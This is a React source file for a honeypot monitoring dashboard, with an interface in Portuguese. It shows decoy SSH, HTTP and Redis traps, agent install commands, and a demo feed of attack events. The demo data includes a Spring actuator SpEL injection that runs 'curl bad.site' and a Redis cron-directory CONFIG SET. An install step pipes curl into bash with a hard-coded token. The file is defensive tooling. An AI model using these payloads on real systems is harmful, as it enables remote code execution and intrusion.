'use client';

import React, { useEffect, useState } from 'react';
import {
  ShieldAlert,
  Radio,
  Terminal,
  Zap,
  RefreshCw,
  Server,
  Key,
  Globe,
  Database,
  Lock,
  Copy,
  CheckCircle,
  AlertTriangle,
  Play,
  Activity,
  Cpu,
  Layers
} from 'lucide-react';
import toast from 'react-hot-toast';
import { grafanaAnalyticsApi } from '@/lib/api';

interface Trap {
  id: string;
  name: string;
  service: string;
  port: number;
  decoy_type: string;
  status: string;
  interactions_count: number;
  last_interaction: string;
  description: string;
}

interface HoneypotEvent {
  id: string;
  trap_name: string;
  attacker_ip: string;
  country: string;
  payload: string;
  severity: string;
  timestamp: string;
  protocol: string;
}

export default function HoneypotPage() {
  const [traps, setTraps] = useState<Trap[]>([]);
  const [events, setEvents] = useState<HoneypotEvent[]>([]);
  const [loading, setLoading] = useState(true);
  const [simulating, setSimulating] = useState(false);
  const [selectedTrap, setSelectedTrap] = useState<string>('');
  const [activeTab, setActiveTab] = useState<'traps' | 'events' | 'install'>('traps');

  const loadData = async () => {
    setLoading(true);
    try {
      await grafanaAnalyticsApi.seedDemo();
      const [trapsRes, eventsRes] = await Promise.all([
        grafanaAnalyticsApi.getHoneypotTraps(),
        grafanaAnalyticsApi.getHoneypotEvents()
      ]);
      setTraps(trapsRes && trapsRes.length > 0 ? trapsRes : defaultTraps);
      setEvents(eventsRes && eventsRes.length > 0 ? eventsRes : defaultEvents);
    } catch (e) {
      setTraps(defaultTraps);
      setEvents(defaultEvents);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    loadData();
  }, []);

  const handleSimulateAttack = async (trapId?: string) => {
    setSimulating(true);
    try {
      const res = await grafanaAnalyticsApi.simulateHoneypotAttack(trapId);
      toast.success(
        `Ataque simulado na armadilha: ${res.trap || 'SSH Decoy Server'} de ${res.attacker_ip || '185.220.101.4'}`
      );
      await loadData();
    } catch (e) {
      toast.error('Erro ao simular ataque no Honeypot');
    } finally {
      setSimulating(false);
    }
  };

  const handleTestRemoteReport = async () => {
    try {
      const res = await grafanaAnalyticsApi.reportRemoteHoneypotAttack({
        trap_name: 'External Remote Server Honeypot (IP: 198.51.100.99)',
        attacker_ip: '194.26.29.112',
        payload_sample: 'SSH-2.0-OpenSSH_8.9p1 / root login probe from external server',
        protocol: 'SSH',
        port: 2222,
        country: 'China'
      });
      toast.success(`Ataque remoto recebido da armadilha externa de ${res.attacker_ip}!`);
      await loadData();
    } catch (e) {
      toast.error('Erro ao testar envio de probe remoto');
    }
  };

  const copyDeployCommand = (port: number, service: string) => {
    const cmd = `docker run -d --name decoy-${service.toLowerCase()} -p ${port}:${port} --restart=always -e CONSOLE_API=http://localhost:8000/api/v1/grafana-analytics/honeypot/report morfeusec/honeypot-decoy:latest`;
    navigator.clipboard.writeText(cmd);
    toast.success(`Comando Docker copiado! (Porta ${port})`);
  };

  const getServiceIcon = (service: string) => {
    switch (service.toUpperCase()) {
      case 'SSH':
        return <Terminal className="h-5 w-5 text-accent-cyan" />;
      case 'HTTP':
      case 'ADMIN':
        return <Globe className="h-5 w-5 text-purple-400" />;
      case 'REDIS':
      case 'MYSQL':
        return <Database className="h-5 w-5 text-emerald-400" />;
      case 'TELNET':
        return <Key className="h-5 w-5 text-amber-400" />;
      default:
        return <Server className="h-5 w-5 text-blue-400" />;
    }
  };

  return (
    <div className="space-y-6">
      {/* Top Banner */}
      <div className="bg-bg-card border border-accent-cyan/20 p-6 rounded-xl relative overflow-hidden flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
        <div className="absolute top-0 right-0 w-96 h-96 bg-accent-cyan/5 rounded-full filter blur-3xl pointer-events-none" />
        <div>
          <div className="flex items-center gap-3">
            <Radio className="h-6 w-6 text-accent-cyan animate-pulse" />
            <h1 className="text-2xl font-bold text-text-primary">
              Honeypot Decoy Center & Threat Traps
            </h1>
            <span className="bg-accent-cyan/10 border border-accent-cyan/30 text-accent-cyan px-2.5 py-0.5 rounded-full text-xs font-mono font-semibold">
              REAL-TIME PROBE DECOYS
            </span>
          </div>
          <p className="text-text-muted text-sm mt-1 max-w-3xl">
            Armadilhas virtuais de decepção projetadas para atrair cibercriminosos, registrar técnicas de varredura, bruteforce e exfiltração, alimentando os dashboards de correlação do Grafana e acionando microsegmentação automática.
          </p>
        </div>
        <div className="flex items-center gap-3">
          <button
            onClick={loadData}
            disabled={loading}
            className="flex items-center gap-2 px-3 py-2 bg-bg-primary border border-border-default hover:border-accent-cyan text-text-primary rounded-lg text-sm transition"
          >
            <RefreshCw className={`h-4 w-4 ${loading ? 'animate-spin' : ''}`} />
            Atualizar
          </button>
          <button
            onClick={() => handleSimulateAttack(selectedTrap)}
            disabled={simulating}
            className="flex items-center gap-2 px-4 py-2 bg-gradient-to-r from-red-600 to-accent-cyan text-white font-medium rounded-lg text-sm hover:opacity-90 shadow-lg shadow-red-500/20 transition disabled:opacity-50"
          >
            <Play className="h-4 w-4 fill-current" />
            {simulating ? 'Simulando...' : 'Simular Ataque em Armadilha'}
          </button>
        </div>
      </div>

      {/* Data Origin & Architecture Explanation Box */}
      <div className="bg-bg-card border border-accent-cyan/30 rounded-xl p-5 space-y-3">
        <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-3 border-b border-border-default pb-3">
          <div className="flex items-center gap-3">
            <div className="p-2 rounded-lg bg-accent-cyan/10 text-accent-cyan border border-accent-cyan/20">
              <Database className="h-5 w-5" />
            </div>
            <div>
              <h3 className="text-sm font-bold text-text-primary uppercase tracking-wider flex items-center gap-2">
                Origem dos Dados do Honeypot &amp; Conexão Remota
                <span className="text-[10px] px-2 py-0.5 rounded bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 font-mono">
                  MULTI-NODE INGESTION ACTIVE
                </span>
              </h3>
              <p className="text-xs text-text-muted mt-0.5">
                O Honeypot captura eventos de duas fontes primárias: <strong>1. Armadilhas Emuladas Locais</strong> (Docker/K8s) e <strong>2. Agentes Remotos Externos</strong> instalados em qualquer servidor Windows ou Linux.
              </p>
            </div>
          </div>

          <button
            onClick={handleTestRemoteReport}
            className="flex items-center gap-1.5 px-3 py-1.5 bg-bg-primary border border-border-default hover:border-accent-cyan text-text-primary rounded-lg text-xs font-mono transition"
          >
            <Zap className="h-3.5 w-3.5 text-accent-cyan" /> Testar Probe de Servidor Remoto
          </button>
        </div>

        {/* Remote Agent Installation Instructions */}
        <div className="bg-bg-primary p-4 rounded-xl border border-border-default/60 space-y-3 text-xs">
          <h4 className="font-bold text-accent-cyan flex items-center gap-2 font-mono">
            <Terminal className="h-4 w-4" /> Passo a Passo: Como Instalar a Armadilha em um Servidor Aleatório
          </h4>
          <p className="text-text-muted">
            Você pode instalar a armadilha em qualquer servidor cloud (AWS, Azure, DigitalOcean ou servidor on-premise). O agente leve abre portas falsas (ex: 2222, 8080, 6379) e reporta logs de invasores via HTTP/HTTPS para este console central:
          </p>

          <div className="space-y-2 font-mono">
            <div className="bg-bg-card p-3 rounded-lg border border-border-default">
              <div className="flex justify-between items-center text-text-muted text-[11px] mb-1">
                <span>Opção A: Instalação Automática via One-Line Curl Script (Linux/Debian/Ubuntu/CentOS)</span>
                <button
                  onClick={() => {
                    navigator.clipboard.writeText('curl -sSL http://localhost:8000/install-honeypot.sh | bash -s -- --token=HONEYPOT-SECRET-KEY-9841 --server=http://localhost:8000');
                    toast.success('Comando bash copiado!');
                  }}
                  className="text-accent-cyan hover:underline flex items-center gap-1"
                >
                  <Copy className="h-3 w-3" /> Copiar Script
                </button>
              </div>
              <code className="text-emerald-400 select-all block text-[11px]">
                curl -sSL http://localhost:8000/install-honeypot.sh | bash -s -- --token=HONEYPOT-SECRET-KEY-9841 --server=http://localhost:8000
              </code>
            </div>

            <div className="bg-bg-card p-3 rounded-lg border border-border-default">
              <div className="flex justify-between items-center text-text-muted text-[11px] mb-1">
                <span>Opção B: Container Docker Standalone em Servidor Remoto</span>
                <button
                  onClick={() => copyDeployCommand(2222, 'SSH')}
                  className="text-accent-cyan hover:underline flex items-center gap-1"
                >
                  <Copy className="h-3 w-3" /> Copiar Docker Run
                </button>
              </div>
              <code className="text-purple-300 select-all block text-[11px]">
                docker run -d --name decoy-ssh-remote -p 2222:2222 --restart=always -e CONSOLE_API=http://localhost:8000/api/v1/grafana-analytics/honeypot/report morfeusec/honeypot-decoy:latest
              </code>
            </div>
          </div>
        </div>
      </div>

      {/* Active Traps Grid */}
      <div className="bg-bg-card border border-border-default rounded-xl p-6 space-y-4">
        <div className="flex justify-between items-center">
          <h2 className="text-lg font-bold text-text-primary flex items-center gap-2">
            <Radio className="h-5 w-5 text-accent-cyan" />
            Armadilhas (Decoys) Implantadas no Ambiente
          </h2>
          <span className="text-xs text-text-muted font-mono">
            Mostrando {traps.length} portas e serviços simulados
          </span>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          {traps.map((trap) => (
            <div
              key={trap.id}
              onClick={() => setSelectedTrap(trap.id)}
              className={`bg-bg-primary border p-5 rounded-xl transition cursor-pointer relative overflow-hidden ${
                selectedTrap === trap.id
                  ? 'border-accent-cyan ring-1 ring-accent-cyan/50 shadow-lg shadow-accent-cyan/10'
                  : 'border-border-default hover:border-text-muted'
              }`}
            >
              <div className="flex items-start justify-between">
                <div className="flex items-center gap-3">
                  <div className="p-2.5 bg-bg-card border border-border-default rounded-lg">
                    {getServiceIcon(trap.service)}
                  </div>
                  <div>
                    <h3 className="font-semibold text-text-primary text-sm">{trap.name}</h3>
                    <span className="text-xs font-mono text-accent-cyan">
                      Porta {trap.port} / {trap.service}
                    </span>
                  </div>
                </div>
                <span
                  className={`text-[10px] font-mono px-2 py-0.5 rounded-full border ${
                    trap.status === 'ONLINE'
                      ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30'
                      : 'bg-amber-500/10 text-amber-400 border-amber-500/30'
                  }`}
                >
                  {trap.status}
                </span>
              </div>

              <p className="text-xs text-text-muted mt-3 line-clamp-2">{trap.description}</p>

              <div className="mt-4 pt-3 border-t border-border-default/50 flex justify-between items-center text-xs">
                <div className="font-mono text-text-muted">
                  Interações: <span className="text-text-primary font-bold">{trap.interactions_count}</span>
                </div>
                <button
                  onClick={(e) => {
                    e.stopPropagation();
                    copyDeployCommand(trap.port, trap.service);
                  }}
                  className="flex items-center gap-1 text-[11px] text-accent-cyan hover:underline font-mono"
                  title="Copiar comando de deploy Docker"
                >
                  <Copy className="h-3 w-3" /> Docker Deploy
                </button>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Real-time Interaction Events Table */}
      <div className="bg-bg-card border border-border-default rounded-xl p-6 space-y-4">
        <div className="flex justify-between items-center">
          <div>
            <h2 className="text-lg font-bold text-text-primary flex items-center gap-2">
              <Terminal className="h-5 w-5 text-red-400" />
              Feed de Eventos e Tentativas de Invasão em Tempo Real
            </h2>
            <p className="text-xs text-text-muted mt-0.5">
              Probes e payloads interceptados pelas armadilhas Honeypot e correlacionados com eBPF / Wazuh
            </p>
          </div>
          <span className="text-xs font-mono bg-red-500/10 border border-red-500/30 text-red-400 px-3 py-1 rounded-full flex items-center gap-1.5">
            <span className="h-2 w-2 rounded-full bg-red-500 animate-ping" />
            LIVE FEED ACTIVE
          </span>
        </div>

        <div className="overflow-x-auto border border-border-default rounded-lg">
          <table className="w-full text-left text-sm">
            <thead className="bg-bg-primary text-text-muted uppercase font-mono text-[11px] border-b border-border-default">
              <tr>
                <th className="p-3">Data / Hora</th>
                <th className="p-3">Armadilha Alvo</th>
                <th className="p-3">IP Atacante & Origem</th>
                <th className="p-3">Payload / Comando Tentado</th>
                <th className="p-3">Protocolo</th>
                <th className="p-3 text-right">Gravidade</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-border-default/50 font-mono text-xs">
              {events.map((evt) => (
                <tr key={evt.id} className="hover:bg-bg-primary/50 transition">
                  <td className="p-3 text-text-muted">{new Date(evt.timestamp).toLocaleString('pt-BR')}</td>
                  <td className="p-3 text-accent-cyan font-semibold">{evt.trap_name}</td>
                  <td className="p-3">
                    <span className="text-text-primary font-bold">{evt.attacker_ip}</span>
                    <span className="text-text-muted ml-2 text-[10px] font-sans">({evt.country})</span>
                  </td>
                  <td className="p-3 text-text-primary">
                    <code className="bg-bg-primary border border-border-default px-2 py-1 rounded text-purple-300 font-mono text-[11px] block max-w-md truncate">
                      {evt.payload}
                    </code>
                  </td>
                  <td className="p-3 text-text-muted">{evt.protocol}</td>
                  <td className="p-3 text-right">
                    <span
                      className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                        evt.severity === 'CRITICAL'
                          ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                          : evt.severity === 'HIGH'
                          ? 'bg-amber-500/20 text-amber-400 border border-amber-500/30'
                          : 'bg-blue-500/20 text-blue-400 border border-blue-500/30'
                      }`}
                    >
                      {evt.severity}
                    </span>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}

// Fallback Default Traps
const defaultTraps: Trap[] = [
  {
    id: 'trap-1',
    name: 'SSH Decoy Trap (OpenSSH Mock)',
    service: 'SSH',
    port: 2222,
    decoy_type: 'Linux Ubuntu Server SSH Decoy',
    status: 'ONLINE',
    interactions_count: 1420,
    last_interaction: 'Agora mesmo',
    description: 'Emula um serviço SSH vulnerável capturando tentativas de password spraying e chave privada RSA.'
  },
  {
    id: 'trap-2',
    name: 'HTTP Admin Portal & Spring Actuator',
    service: 'HTTP',
    port: 8080,
    decoy_type: 'Web Portal & API Decoy',
    status: 'ONLINE',
    interactions_count: 890,
    last_interaction: 'Há 2 min',
    description: 'Painel administrativo falso que registra tentativas de SQLi, RCE em endpoints actuator e file upload.'
  },
  {
    id: 'trap-3',
    name: 'Redis NoSQL Unauthenticated Decoy',
    service: 'REDIS',
    port: 6379,
    decoy_type: 'Cache Database Decoy',
    status: 'ONLINE',
    interactions_count: 440,
    last_interaction: 'Há 5 min',
    description: 'Instância Redis exposta sem senha para capturar comandos INFO, CONFIG SET e cron injection.'
  }
];

// Fallback Default Events
const defaultEvents: HoneypotEvent[] = [
  {
    id: 'evt-1',
    trap_name: 'SSH Decoy Trap (Port 2222)',
    attacker_ip: '185.220.101.4',
    country: 'Alemanha (Tor Exit Node)',
    payload: 'root:P@ssw0rd2026! SSH Login Attempt',
    severity: 'CRITICAL',
    timestamp: new Date().toISOString(),
    protocol: 'SSH/2.0'
  },
  {
    id: 'evt-2',
    trap_name: 'HTTP Admin Portal (Port 8080)',
    attacker_ip: '45.148.10.12',
    country: 'Rússia',
    payload: "POST /actuator/gateway/routes/test WITH payload: #{T(java.lang.Runtime).getRuntime().exec('curl bad.site')}",
    severity: 'CRITICAL',
    timestamp: new Date(Date.now() - 120000).toISOString(),
    protocol: 'HTTP/1.1'
  },
  {
    id: 'evt-3',
    trap_name: 'Redis NoSQL Decoy (Port 6379)',
    attacker_ip: '198.51.100.44',
    country: 'Estados Unidos',
    payload: 'CONFIG SET dir /var/spool/cron/crontabs/',
    severity: 'HIGH',
    timestamp: new Date(Date.now() - 300000).toISOString(),
    protocol: 'RESP'
  }
];
